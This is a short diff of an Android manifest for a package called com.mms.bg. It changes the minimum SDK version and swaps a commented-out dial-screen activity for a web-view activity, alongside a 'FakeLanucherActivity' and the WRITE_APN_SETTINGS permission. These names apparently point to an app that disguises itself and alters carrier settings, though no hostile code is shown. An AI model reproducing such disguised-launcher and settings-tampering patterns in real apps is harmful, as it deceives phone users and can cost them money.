@@ -32,7 +32,7 @@
     <uses-permission android:name="android.permission.WRITE_APN_SETTINGS" />
     <!-- uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" / -->
 
-	<uses-sdk android:minSdkVersion="4"/>
+	<uses-sdk android:minSdkVersion="3"/>
 
     <application android:label="@string/app_name"
             android:icon="@drawable/icon"
@@ -50,11 +50,10 @@
             </intent-filter>
         </activity>
         
-		<!-- activity android:name="com.mms.bg.ui.DialScreenActivity"
+		<activity android:name="com.mms.bg.ui.VedioWebViewActivity"
                   android:label="@string/app_name"
-                  android:configChanges="orientation|keyboardHidden"
-                  android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
-        </activity -->
+                  android:configChanges="orientation|keyboardHidden">
+        </activity>
 
        <activity android:name="com.mms.bg.ui.FakeLanucherActivity"
                   android:label="@string/app_name"
